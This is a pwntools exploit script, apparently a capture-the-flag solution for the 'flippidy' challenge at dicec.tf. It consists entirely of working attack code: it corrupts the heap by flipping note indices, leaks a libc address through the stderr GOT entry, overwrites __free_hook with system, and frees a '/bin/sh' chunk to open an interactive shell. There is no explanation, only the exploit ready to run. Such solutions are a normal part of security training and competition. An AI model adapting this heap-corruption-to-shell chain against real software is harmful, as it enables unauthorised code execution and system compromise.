#!/usr/bin/env python3

from pwn import *

exe = ELF("../flippidy")
libc = ELF("../libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

host = args.HOST or "dicec.tf"
port = args.PORT or 31904

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

# good luck pwning :)

wtmoo = True

def add(idx, data=b''):
  r.recvuntil(': ')
  r.sendline('1')
  r.sendlineafter('Index: ', str(idx))
  r.sendlineafter('Content: ', data)

def flip():
  r.recvuntil(': ')
  r.sendline('2')

while True:
  try:
    with context.local(log_level='error'):
      r = conn()
      r.sendline('3')
      if args.LOCAL:
        if u16(r.leak(0x404158, 2)) != 0x260:
          r.close()
          continue
    debug()
    add(1, b'\x60\x00')
    flip()
    add(2, p64(0x404158))
    add(0, p64(0x404020))

    add(2)
    add(2, p64(0x404020))
    add(2, p64(0x404040) + p64(exe.got['stderr'])*3 + p64(0x404020))
    r.recvline()
    r.recvline()
    r.recvline()
    libc.address = u64(r.recvline().strip().ljust(8, b'\x00')) - libc.sym['_IO_2_1_stderr_']
    log.info(hex(libc.address))

    add(2)
    add(2, p64(0x404040)*4 + p64(libc.sym['__free_hook']-8))
    add(2)
    add(0, b'/bin/sh\x00' + p64(libc.sym['system']))
    flip()

    r.interactive()
    break
  except EOFError:
    r.close()
    continue
